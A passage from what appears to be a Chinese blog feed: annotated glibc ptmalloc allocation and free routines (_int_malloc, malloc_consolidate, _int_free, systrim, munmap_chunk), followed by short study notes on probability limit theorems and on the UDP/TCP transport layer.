NON_MAIN_ARENA : 0)); //设置头部(addr + 0x8),包括大小和标志位,由于临近的前一个chunk一定位于使用中,所以PREV_INUSE为1 set_head (remainder, remainder_size | PREV_INUSE); //同理,由于victim会被分配给用户,所以PREV_INUSE为1 set_foot (remainder, remainder_size); //该chunk不在使用中,使用set_foot对该chunk的inuse标志位置零 check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; //同上,正常的分配流程 &#125; unsorted_chunks (av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunks (av); /* 不满足上述情况则将该chunk从unsorted bin链表中取出 */ if (size == nb) &#123; /* victim与所需的chunk大小一致 */ set_inuse_bit_at_offset (victim, size); //对victim的inuse标志位置零 if (av != &amp;main_arena) //不属于主分配区则对对应的标志位置零 victim-&gt;size |= NON_MAIN_ARENA; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; //同上,正常的分配流程 &#125; //到这说明victim不会被分配了,而是会放入对应的bin链表 if (in_smallbin_range (size)) &#123; /* victim属于small bins */ victim_index = smallbin_index (size); //获得所属small bin的index bck = bin_at (av, victim_index); //将该small bin的链表表头赋值给bck fwd = bck-&gt;fd; //该small bin第一个chunk赋值给fwd //victim会插入到bck和fwd之间,作为该small bin链表的第一个chunk. &#125; else &#123; /* victim属于large bins */ victim_index = largebin_index (size); //获得所属large bin的index bck = bin_at (av, victim_index); //将该large bin的链表表头赋值给bck fwd = bck-&gt;fd; //该large bin第一个chunk赋值给fwd if (fwd != bck) &#123; /* fwd不等于bck意味着该large bin中有空闲chunk存在 */ size |= PREV_INUSE; /* 将当前chunk的size的inuse标志bit置位,相当于加1,便于加快chunk大小的比较 */ assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0); /* 断言在该large bin最后一个chunk的size字段中的非主分配区的标志bit没有置位 */ if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size)) &#123; /* 当前chunk比large bin的最后一个chunk的大小还小,那么当前chunk就插入到large bin的链表的最后. */ fwd = bck; //fwd赋值为表头 bck = bck-&gt;bk; //bck赋值为最后一个chunk victim-&gt;fd_nextsize = fwd-&gt;fd; victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; //chunk size列表是将不同大小的第一个chunk连起来,将victim插入该链表的尾部,该链表是从大到小排列的 &#125; else &#123; assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); /* 断言在该large bin第一个chunk的size字段中的非主分配区的标志bit没有置位 */ while ((unsigned long) size &lt; fwd-&gt;size) &#123; /* 正向遍历chunk size链表,直到找到第一个小于大于等于当前chunk大小的chunk */ fwd = fwd-&gt;fd_nextsize; assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); &#125; if ((unsigned long) size == (unsigned long) fwd-&gt;size) /* 则同一大小的chunk已经存在,则不需要修改chunk size链表,当前chunk插入fwd之后 */ fwd = fwd-&gt;fd; else &#123; /* 当前chunk的大小大于fwd的大小,则将当前chunk作为该chunk size的代表加入chunk size链表,位置为fwd的前面 */ victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; &#125; bck = fwd-&gt;bk; &#125; &#125; else /* 如果large bin链表中没有chunk,直接将当前chunk加入chunk size链表,chunk size链表表头位于第一个chunk的fd_nextsize和bk_nextsize,所以第一个chunk是最大的 */ victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim; &#125; mark_bin (av, victim_index); //将对应map里该index对应的标志位置1 victim-&gt;bk = bck; victim-&gt;fd = fwd; fwd-&gt;bk = victim; bck-&gt;fd = victim; /* 将当前chunk插入到对应bin中 */#define MAX_ITERS 10000 if (++iters &gt;= MAX_ITERS) /* 如果unsorted bin中的chunk超过了10000个,最多遍历10000个就退出,避免长时间处理unsorted bin影响内存分配的效率 */ break; &#125; //此时unsorted bin链表已经清空 if (!in_smallbin_range (nb)) &#123; /* 所需分配的chunk为large bin chunk */ bin = bin_at (av, idx); //获取对应的bin if ((victim = first (bin)) != bin &amp;&amp; (unsigned long) (victim-&gt;size) &gt;= (unsigned long) (nb)) &#123; /* 如果large bin链表不为空且链表中最大的chunk能满足要求,则遍历该large bin链表,找到合适的chunk. */ victim = victim-&gt;bk_nextsize; //从最后一个也就是最小一个开始遍历 while (((unsigned long) (size = chunksize (victim)) &lt; (unsigned long) (nb))) /* 反向遍历chunk size链表,直到找到第一个大于等于所需chunk大小的chunk退出循环 */ victim = victim-&gt;bk_nextsize; if (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size) /* 如果victim不是链表中的最后一个chunk且与victim大小相同的chunk不止一个,意味着victim为chunk size链表中的节点,取victim-&gt;fd节点对应的chunk作为候选chunk */ victim = victim-&gt;fd; remainder_size = size - nb; //由于size可能大于所需的chunk,所以要计算看是否要划分 unlink (av, victim, bck, fwd); /* 调用unlink()宏函数将victim从large bin链表中取出 */ if (remainder_size &lt; MINSIZE) &#123; /* 如果将victim切分后剩余大小小于MINSIZE,则将整个victim返回,实际分配的chunk比所需的chunk要大一些 */ set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) victim-&gt;size |= NON_MAIN_ARENA; &#125; else &#123; /* 从victim中切分出所需的chunk,剩余部分作为一个新的chunk加入到unsorted bin,其他处理与前面类似 */ remainder = chunk_at_offset (victim, nb); //计算剩余chunk的地址 bck = unsorted_chunks (av); //获取unsorted bin的表头 fwd = bck-&gt;fd; //赋值fwd为第一个chunk if (__glibc_unlikely (fwd-&gt;bk != bck)) &#123; //验证第一个chunk的bk errstr = "malloc(): corrupted unsorted chunks"; goto errout; &#125; remainder-&gt;bk = bck; remainder-&gt;fd = fwd; bck-&gt;fd = remainder; fwd-&gt;bk = remainder; //将remainder插入为unsorted bin的第一个chunk if (!in_smallbin_range (remainder_size)) &#123; /* 若剩下的chunk属于large bin chunk,将该chunk的fd_nextsize和bk_nextsize设置为NULL */ remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); //划分后设置,同上 &#125; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; //返回chunk过程,同上 &#125; &#125; /* 从最合适的small bin或large bin中都没有分配到需要的chunk,则查看比当前bin的index大的small bin或large bin是否有空闲chunk可利用来分配所需的chunk */ ++idx; bin = bin_at (av, idx); //获取下一个相邻bin的空闲chunk链表 block = idx2block (idx); map = av-&gt;binmap[block]; bit = idx2bit (idx); //获取该bin对于binmap中的bit位的值,使用binmap可以加快查找bin是否包含空闲chunk,idx2bit()宏将idx指定的位设置为1,其它位清零 for (;; ) &#123; if (bit &gt; map || bit == 0) &#123; /* map为0即该block所对应的所有bins中都没有空闲chunk.于是遍历binmap的下一个block,直到找到一个不为0的block或者遍历完所有的block */ do &#123; if (++block &gt;= BINMAPSIZE) /* 遍历完所有的block都没有则使用top chunk分配 */ goto use_top; &#125; while ((map = av-&gt;binmap[block]) == 0); bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT)); bit = 1; &#125; while ((bit &amp; map) == 0) &#123; /* 在一个block遍历对应的bin直到找到一个bit不为0退出遍历 */ bin = next_bin (bin); bit &lt;&lt;= 1; assert (bit != 0); &#125; victim = last (bin); /* 将bin链表中的最后一个chunk赋值为victim */ if (victim == bin) &#123; /* victim与bin链表头指针相同,表示该bin中没有空闲chunk,binmap中的相应位设置不准确,将binmap的相应bit位清零,获取当前bin下一个bin,将bit移到下一个bit位,即乘以2 */ av-&gt;binmap[block] = map &amp;= ~bit; /* Write through */ bin = next_bin (bin); bit &lt;&lt;= 1; &#125; else &#123; /* 当前bin中的最后一个chunk满足要求,获取该chunk的大小,计算切分出所需chunk后剩余部分的大小,然后将victim从bin的链表中取出 */ size = chunksize (victim); assert ((unsigned long) (size) &gt;= (unsigned long) (nb)); remainder_size = size - nb; unlink (av, victim, bck, fwd); if (remainder_size &lt; MINSIZE) &#123; set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) victim-&gt;size |= NON_MAIN_ARENA; &#125; else &#123; remainder = chunk_at_offset (victim, nb); bck = unsorted_chunks (av); fwd = bck-&gt;fd; if (__glibc_unlikely (fwd-&gt;bk != bck)) &#123; errstr = "malloc(): corrupted unsorted chunks 2"; goto errout; &#125; remainder-&gt;bk = bck; remainder-&gt;fd = fwd; bck-&gt;fd = remainder; fwd-&gt;bk = remainder; if (in_smallbin_range (nb)) /* 剩余部分chunk属于small bins,将分配区的last remainder chunk设置为剩余部分构成的chunk */ av-&gt;last_remainder = remainder; if (!in_smallbin_range (remainder_size)) &#123; remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); &#125; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; use_top: /* 如果从所有的bins中都没有获得所需的chunk,可能的情况为bins中没有空闲chunk或者所需的chunk大小很大,下一步将尝试从top chunk中分配所需chunk */ victim = av-&gt;top; size = chunksize (victim); /* 将当前分配区的top chunk赋值给victim,并获得victim的大小 */ if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) &#123; /* top chunk切分出所需chunk后还需要MINSIZE的空间来作为fencepost,必须满足top chunk的大小大于所需chunk的大小加上MINSIZE */ /* 切分处理跟前面类似,不同的是原top chunk切分后的剩余部分将作为新的top chunk,原top chunk的fencepost仍然作为新的top chunk的fencepost,所以切分之后剩余的chunk不用set_foot */ remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); av-&gt;top = remainder; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; else if (have_fastchunks (av)) &#123; /* 如果top chunk也不能满足要求,查看fast bins中是否有空闲chunk存在,因为free属于fast bins的chunk时不需要获得分配区的锁,调用malloc_consolidate()函数并重新设置当前bin的index,再次循环 */ malloc_consolidate (av); if (in_smallbin_range (nb)) idx = smallbin_index (nb); else idx = largebin_index (nb); &#125; else &#123; /* 向系统申请内存 */ void *p = sysmalloc (nb, av); if (p != NULL) alloc_perturb (p, bytes); return p; &#125; &#125;&#125; malloc_consolidate12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788static void malloc_consolidate(mstate av) &#123; mfastbinptr* fb; /* current fastbin being consolidated */ mfastbinptr* maxfb; /* last fastbin (for loop control) */ mchunkptr p; /* current chunk being consolidated */ mchunkptr nextp; /* next chunk to consolidate */ mchunkptr unsorted_bin; /* bin header */ mchunkptr first_unsorted; /* chunk to link to */ /* These have same use as in free() */ mchunkptr nextchunk; INTERNAL_SIZE_T size; INTERNAL_SIZE_T nextsize; INTERNAL_SIZE_T prevsize; int nextinuse; mchunkptr bck; mchunkptr fwd; if (get_max_fast () != 0) &#123; /* 如果全局变量global_max_fast不为零,表示ptmalloc已经初始化,清除分配区flag中fast bin的标志位 */ clear_fastchunks(av); unsorted_bin = unsorted_chunks(av); maxfb = &amp;fastbin (av, NFASTBINS - 1); fb = &amp;fastbin (av, 0); /* 将分配区最大的一个fast bin赋值给maxfb,第一个fast bin赋值给fb,然后遍历fast bins */ do &#123; p = atomic_exchange_acq (fb, 0); /* 获取当前遍历的fast bin中空闲chunk单向链表的头指针 */ if (p != 0) &#123; do &#123; check_inuse_chunk(av, p); nextp = p-&gt;fd; size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA); nextchunk = chunk_at_offset(p, size); nextsize = chunksize(nextchunk); /* 获得当前chunk的size并去除size中的PREV_INUSE和NON_MAIN_ARENA标志,获取相邻的下一个chunk和下一个chunk的大小 */ if (!prev_inuse(p)) &#123; /* 如果当前chunk的前一个chunk空闲则将当前chunk与前一个chunk合并成一个空闲chunk */ prevsize = p-&gt;prev_size; size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd); &#125; if (nextchunk != av-&gt;top) &#123; /* 如果与当前chunk相邻的下一个chunk不是分配区的top chunk,查看与当前chunk相邻的下一个chunk是否处于inuse状态 */ nextinuse = inuse_bit_at_offset(nextchunk, nextsize); if (!nextinuse) &#123; /* 下一个chunk空闲则将当前chunk与下一个chunk合并成一个空闲chunk */ size += nextsize; unlink(av, nextchunk, bck, fwd); &#125; else /* 与当前chunk相邻的下一个chunk处于inuse状态,清除当前chunk的inuse状态 */ clear_inuse_bit_at_offset(nextchunk, 0); first_unsorted = unsorted_bin-&gt;fd; unsorted_bin-&gt;fd = p; first_unsorted-&gt;bk = p; /* 将合并后的chunk加入unsorted bin的双向循环链表中 */ if (!in_smallbin_range (size)) &#123; p-&gt;fd_nextsize = NULL; p-&gt;bk_nextsize = NULL; &#125; set_head(p, size | PREV_INUSE); p-&gt;bk = unsorted_bin; p-&gt;fd = first_unsorted; set_foot(p, size); &#125; else &#123; /* 当前chunk的下一个chunk为top chunk则将当前chunk合并入top chunk */ size += nextsize; set_head(p, size | PREV_INUSE); av-&gt;top = p; &#125; &#125; while ( (p = nextp) != 0); /* 直到遍历完当前fast bin中的所有空闲chunk */ &#125; &#125; while (fb++ != maxfb); /* 直到遍历完所有的fast bins */ &#125; else &#123; /* 如果ptmalloc没有初始化,初始化ptmalloc */ malloc_init_state(av); check_malloc_state(av); &#125;&#125; freeptmalloc中free函数实现为__libc_free. 123456789101112131415161718192021222324252627void __libc_free (void *mem) &#123; mstate ar_ptr; mchunkptr p; void (*hook) (void *, const void *) = atomic_forced_read (__free_hook); if (__builtin_expect (hook != NULL, 0)) &#123; (*hook)(mem, RETURN_ADDRESS (0)); return; &#125; if (mem == 0) return; p = mem2chunk (mem); if (chunk_is_mmapped (p)) &#123; /* 如果当前free的chunk是通过mmap()分配的,调用munmap_chunk()函数munmap本chunk */ if (!mp_.no_dyn_threshold &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX) &#123; /* 如果开启了mmap分配阈值动态调整机制且chunk的大小大于设置的mmap分配阈值,小于mmap分配阈值的最大值.则将当前chunk的大小赋值给mmap分配阈值,并修改mmap收缩阈值为mmap分配阈值的2倍 */ mp_.mmap_threshold = chunksize (p); mp_.trim_threshold = 2 * mp_.mmap_threshold; LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2, mp_.mmap_threshold, mp_.trim_threshold); &#125; munmap_chunk (p); return; &#125; ar_ptr = arena_for_chunk (p); _int_free (ar_ptr, p, 0); /* 不需要对分配区加锁,调用_int_free()函数执行实际的释放工作 */&#125; _int_free123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181static void _int_free (mstate av, mchunkptr p, int have_lock) &#123; INTERNAL_SIZE_T size; /* its size */ mfastbinptr *fb; /* associated fastbin */ mchunkptr nextchunk; /* next contiguous chunk */ INTERNAL_SIZE_T nextsize; /* its size */ int nextinuse; /* true if nextchunk is used */ INTERNAL_SIZE_T prevsize; /* size of previous contiguous chunk */ mchunkptr bck; /* misc temp for linking */ mchunkptr fwd; /* misc temp for linking */ const char *errstr = NULL; int locked = 0; size = chunksize (p); if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0) || __builtin_expect (misaligned_chunk (p), 0)) &#123; /* chunk的指针地址不能溢出 */ errstr = "free(): invalid pointer"; errout: if (!have_lock &amp;&amp; locked) (void) mutex_unlock (&amp;av-&gt;mutex); malloc_printerr (check_action, errstr, chunk2mem (p), av); return; &#125; if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size))) &#123; /* chunk的大小必须大于等于MINSIZE且对齐 */ errstr = "free(): invalid size"; goto errout; &#125; check_inuse_chunk(av, p); if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ())#if TRIM_FASTBINS &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)#endif ) &#123; /* 当前free的chunk属于fast bins */ if (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem, 0)) &#123; /* 查看下一个相邻的chunk的大小是否小于等于2*SIZE_SZ，下一个相邻chunk的大小是否大于分配区所分配的内存总量 */ if (have_lock || (&#123; assert (locked == 0); mutex_lock(&amp;av-&gt;mutex); locked = 1; chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem; &#125;)) &#123; /* 读取分配区所分配的内存总量需要对分配区加锁,检查完以后,释放分配区的锁 */ errstr = "free(): invalid next size (fast)"; goto errout; &#125; if (! have_lock) &#123; (void)mutex_unlock(&amp;av-&gt;mutex); locked = 0; &#125; &#125; free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); set_fastchunks(av); unsigned int idx = fastbin_index(size); fb = &amp;fastbin (av, idx); /* 设置当前分配区的fast bin flag,表示当前分配区的fast bins中已有空闲chunk.然后根据当前free的chunk大小获取所属的fast bin */ mchunkptr old = *fb, old2; unsigned int old_idx = ~0u; do &#123; if (__builtin_expect (old == p, 0)) &#123; /* fast bin double free 检测 */ errstr = "double free or corruption (fasttop)"; goto errout; &#125; if (have_lock &amp;&amp; old != NULL) old_idx = fastbin_index(chunksize(old)); p-&gt;fd = old2 = old; &#125; while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2); /* 使用lock-free技术实现fast bin的单向链表插入操作 */ if (have_lock &amp;&amp; old != NULL &amp;&amp; __builtin_expect (old_idx != idx, 0)) &#123; errstr = "invalid fastbin entry (free)"; goto errout; &#125; &#125; else if (!chunk_is_mmapped(p)) &#123; /* 当前free的chunk不是通过mmap()分配的,并且当前还没有获得分配区的锁,获取分配区的锁 */ if (! have_lock) &#123; (void)mutex_lock(&amp;av-&gt;mutex); locked = 1; &#125; nextchunk = chunk_at_offset(p, size); /* 安全检测 */ if (__glibc_unlikely (p == av-&gt;top)) &#123; errstr = "double free or corruption (top)"; goto errout; &#125; if (__builtin_expect (contiguous (av) &amp;&amp; (char *) nextchunk &gt;= ((char *) av-&gt;top + chunksize(av-&gt;top)), 0)) &#123; errstr = "double free or corruption (out)"; goto errout; &#125; if (__glibc_unlikely (!prev_inuse(nextchunk))) &#123; errstr = "double free or corruption (!prev)"; goto errout; &#125; nextsize = chunksize(nextchunk); if (__builtin_expect (nextchunk-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (nextsize &gt;= av-&gt;system_mem, 0)) &#123; /* 计算当前free的chunk的下一个相邻chunk的大小,该大小如果小于等于2*SIZE_SZ或是大于了分配区所分配区的内存总量,报错 */ errstr = "free(): invalid next size (normal)"; goto errout; &#125; free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); if (!prev_inuse(p)) &#123; /* 如果当前free的chunk的前一个相邻chunk为空闲状态,与前一个空闲chunk合并 */ prevsize = p-&gt;prev_size; size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd); &#125; if (nextchunk != av-&gt;top) &#123; /* 与当前free的chunk相邻的下一个chunk不是分配区的top chunk */ nextinuse = inuse_bit_at_offset(nextchunk, nextsize); if (!nextinuse) &#123; /* 如果当前free的chunk的下一个相邻chunk为空闲状态,与下一个空闲chunk合并 */ unlink(av, nextchunk, bck, fwd); size += nextsize; &#125; else /* 与当前free的chunk相邻的下一个chunk处于inuse状态,清除当前chunk的inuse状态 */ clear_inuse_bit_at_offset(nextchunk, 0); bck = unsorted_chunks(av); fwd = bck-&gt;fd; if (__glibc_unlikely (fwd-&gt;bk != bck)) &#123; errstr = "free(): corrupted unsorted chunks"; goto errout; &#125; p-&gt;fd = fwd; p-&gt;bk = bck; if (!in_smallbin_range(size)) &#123; p-&gt;fd_nextsize = NULL; p-&gt;bk_nextsize = NULL; &#125; bck-&gt;fd = p; fwd-&gt;bk = p; /* 将合并后的chunk加入unsorted bin的双向循环链表中 */ set_head(p, size | PREV_INUSE); set_foot(p, size); check_free_chunk(av, p); &#125; else &#123; /* 当前free的chunk下一个相邻的chunk为top chunk,则将当前chunk合并入top chunk */ size += nextsize; set_head(p, size | PREV_INUSE); av-&gt;top = p; check_chunk(av, p); &#125; if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123; /* 如果合并后的chunk大小大于64KB */ if (have_fastchunks(av)) malloc_consolidate(av); if (av == &amp;main_arena) &#123;#ifndef MORECORE_CANNOT_TRIM if ((unsigned long)(chunksize(av-&gt;top)) &gt;= (unsigned long)(mp_.trim_threshold)) /* 如果当前分配区为主分配区且top chunk的大小大于heap的收缩阈值,调用sYSTRIm()函数收缩heap */ systrim(mp_.top_pad, av);#endif &#125; else &#123; /* 为非主分配区,调用heap_trim()函数收缩非主分配区的sub_heap */ heap_info *heap = heap_for_ptr(top(av)); assert(heap-&gt;ar_ptr == av); heap_trim(heap, mp_.top_pad); &#125; &#125; if (! have_lock) &#123; /* 有锁则对分配区解锁 */ assert (locked); (void)mutex_unlock(&amp;av-&gt;mutex); &#125; &#125; else &#123; /* 当前free的chunk是通过mmap()分配则调用munma_chunk()释放内存 */ munmap_chunk (p); &#125;&#125; systrim12345678910111213141516171819202122232425262728293031323334353637383940414243444546static int systrim (size_t pad, mstate av) &#123; long top_size; /* Amount of top-most memory */ long extra; /* Amount to release */ long released; /* Amount actually released */ char *current_brk; /* address returned by pre-check sbrk call */ char *new_brk; /* address returned by post-check sbrk call */ size_t pagesize; long top_area; pagesize = GLRO (dl_pagesize); top_size = chunksize (av-&gt;top); top_area = top_size - MINSIZE - 1; if (top_area &lt;= pad) return 0; extra = ALIGN_DOWN(top_area - pad, pagesize); /* 计算top chunk中最大可释放的整数页大小,top chunk中至少需要MINSIZE的内存保存fencepost */ if (extra == 0) return 0; current_brk = (char *) (MORECORE (0)); if (current_brk == (char *) (av-&gt;top) + top_size) &#123; /* 如果当前top chunk的结束地址与当前的brk值相等,执行heap收缩。 */ MORECORE (-extra); /* 调用sbrk()释放指定大小的内存 */ void (*hook) (void) = atomic_forced_read (__after_morecore_hook); if (__builtin_expect (hook != NULL, 0)) (*hook)(); new_brk = (char *) (MORECORE (0)); LIBC_PROBE (memory_sbrk_less, 2, new_brk, extra); if (new_brk != (char *) MORECORE_FAILURE) &#123; /* 计算释放的内存大小,更新当前分配区所分配的内存总量,更新top chunk的大小 */ released = (long) (current_brk - new_brk); if (released != 0) &#123; av-&gt;system_mem -= released; set_head (av-&gt;top, (top_size - released) | PREV_INUSE); check_malloc_state (av); return 1; &#125; &#125; &#125; return 0;&#125; munmap_chunk12345678910111213141516171819static void internal_function munmap_chunk (mchunkptr p) &#123; INTERNAL_SIZE_T size = chunksize (p); assert (chunk_is_mmapped (p)); uintptr_t block = (uintptr_t) p - p-&gt;prev_size; size_t total_size = p-&gt;prev_size + size; if (__builtin_expect (((block | total_size) &amp; (GLRO (dl_pagesize) - 1)) != 0, 0)) &#123; /* 校验内存块的起始地址是否是对齐的 */ malloc_printerr (check_action, "munmap_chunk(): invalid pointer", chunk2mem (p), NULL); return; &#125; atomic_decrement (&amp;mp_.n_mmaps); atomic_add (&amp;mp_.mmapped_mem, -total_size); /* 更新分配区的mmap统计信息 */ __munmap ((char *) block, total_size); /* 调用munmap()函数释放chunk */&#125;]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>heap-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mathematics-probability-theory-大数定律及中心极限定理]]></title>
    <url>%2Fposts%2Ffc6e2105%2F</url>
    <content type="text"><![CDATA[概览大数定律是从理论上阐述频率的稳定性和大量r.v.的算术平均值的稳定性. 中心极限定理是描述在一定条件下,相互独立的r.v.之和近似服从正态分布的有关定理. 大数定律依概率收敛 r.v.序列的依概率收敛性与数列的收敛性是不同的,大数定律就是叙述r.v.序列的依概率收敛性的定理. 切比雪夫不等式 辛钦大数定理(弱大数定理) 本定理说明,n个r.v.,如果它们相互独立,且具有有限的相同的数学期望和方差,那么当n很大时,这n个随机变量的算术平均值几乎是一个常数,就是它们的数学期望. 切比雪夫大数定律 贝努利定理 贝努利定理说明事件A发生的频率依概率收敛于事件A发生的概率p,以严格的数学形式表达了频率的稳定性. 中心极限定理独立同分布的中心极限定理 李雅普诺夫(Lyapunov)定理 德莫佛–拉普拉斯(De Moivre-Laplace)定理]]></content>
      <categories>
        <category>mathematics</category>
      </categories>
      <tags>
        <tag>probability-theory</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-computer-network-运输层]]></title>
    <url>%2Fposts%2Fc515eca3%2F</url>
    <content type="text"><![CDATA[概览 从通信和信息处理的角度看,运输层向它上面的应用层提供通信服务,它属于面向通信部分的最高层,同时也是用户功能中的最低层.当网络的边缘部分中的两个主机使用网络的核心部分的功能进行端到端的通信时,只有位于网络边缘部分的主机的协议栈才有运输层,而网络核心部分中的路由器在转发分组时都只用到下三层的功能. 从IP层来说,通信的两端是两台主机.从运输层的角度看,通信的真正端点并不是主机而是主机中的进程.主机A和主机B进行通信实际上是指运行在主机A上的某个程序和运行在主机B上的另一个程序进行通信,端到端的通信是进程之间的通信.运输层提供应用进程间的逻辑通信. 端到端逻辑通信信道对上层的表现却因运输层使用的不同协议而有很大的差别.当运输层采用面向连接的TCP协议时,尽管下面的网络层是不可靠的,但这种逻辑通信信道就相当于一条全双工的可靠信道. 运输层的两个主要协议运输层的两个主要协议:用户数据报协议UDP和传输控制协议TCP. 两个对等运输实体在通信时传送的数据单位叫作运输协议数据单元TPDU,TCP传送的数据单位协议是TCP报文段,UDP传送的数据单位协议是UDP报文或用户数据报. UDP:无连接的协议,提供无连接服务;TPDU是UDP报文或用户数据报;支持单播,多播,广播;不提供可靠交付; TCP:面向连接的协议,提供面向连接服务;TPDU是TCP报文;支持点对点单播,不支持多播,广播;提供可靠服务; 运输层的端口运行在计算机中的进程是用进程标识符来标志的,但运行在应用层的各种应用进程却不应当依赖计算机操作系统指派的进程标识符进行通信.因为在互联网上使用的计算机的操作系统种类很多,而不同的操作系统又使用不同格式的进程标识符. 为了使运行不同操作系统的计算机的应用进程能够互相通信,就必须用统一的方法对TCP/IP体系的应用进程进行标志.解决问题的方法就是在运输层使用协议端口号,或通常简称为端口.在协议栈层间的抽象的协议端口是软件端口,路由器或交换机上的端口是硬件端口,硬件端口是不同硬件设备进行交互的接口,而软件端口是应用层的各种协议进程与运输实体进行层间交互的一种地址. 端口用一个16位端口号进行标志,允许有65535个不同的端口号,端口号只具有本地意义,即端口号只是为了标志本计算机应用层中的各进程.两个计算机中的进程要互相通信,不仅必须知道对方的端口号,而且还要知道对方的IP地址(为了找到对方的计算机). 服务器端使用的端口号:熟知端口号,数值一般为0 ~ 1023;登记端口号,数值为1024 ~ 49151,为没有熟知端口号的应用程序使用的,使用这个范围的端口号必须在IANA登记,以防重复. 客户端使用的端口号:又称为短暂端口号,数值为49152 ~ 65535,留给客户进程选择暂时使用.当服务器进程收到客户进程的报文时,就知道了客户进程所使用的动态端口号.通信结束后,这个端口号可供其他客户进程以后使用. 用户数据报协议UDPUDP只在IP的数据报服务之上增加了很少一点的功能:复用和分用的功能;差错检测的功能. UDP的主要特点:UDP是无连接的;UDP使用尽最大努力交付,UDP是面向报文的;UDP对应用层交下来的报文,在添加首部后就向下交付IP层,保留这些报文的边界(不合并,也不拆分),一次交付一个完整的报文.接收方UDP对IP层交上来的UDP用户数据报,在去除部后就原封不动地交付上层的应用进程;UDP没有拥塞控制;UDP支持一对一,一对多,多对一和多对多的交互通信;UDP的首部开销小,只有8个字节. 应用程序必须选择合适大小的报文,报文太长IP层在传送时可能要进行分片,这会降低IP层的效率.报文太短会使IP数据报的首部的相对长度太大,也降低了IP层的效率. 用户数据报UDP有两个字段:数据字段和首部字段.首部字段有8个字节,由4个字段组成,每个字段都是2个字节,分别是源端口,目的端口,长度,校验和. 在计算检验和时,临时把12字节的伪首部和UDP用户数据报连接在一起,伪首部仅仅是为了计算检验和.在加数字的时候,从最高位溢出的比特必须要加到结果上. 当运输层从IP层收到UDP数据报时,就根据首部中的目的端口,把UDP数据报通过相应的端口上交给应用进程. 传输控制协议TCP概述TCP是面向连接的运输层协议,在无连接的,不可靠的IP网络服务基础之上提供可靠交付的服务,提供全双工通信.TCP连接只能有两个端点,是点对点的. TCP是面向字节流的,TCP中的流指的是流入或流出进程的字节序列,即虽然应用程序和TCP的交互是一次一个数据块,但TCP把应用程序交下来的数据看成仅仅是一连串无结构的字节流.TCP不保证接收方应用程序所收到的数据块和发送方应用程序所发出的数据块具有对应大小的关系,但接收方应用程序收到的字节流必须和发送方应用程序发出的字节流完全一样. TCP将太长的数据块划分短一些再传送,根据对方给出的窗口值和当前网络拥塞的程度来决定一个报文段应包含多少个字节.TCP可等待积累有足够多的字节后再构成报文段发送出去. 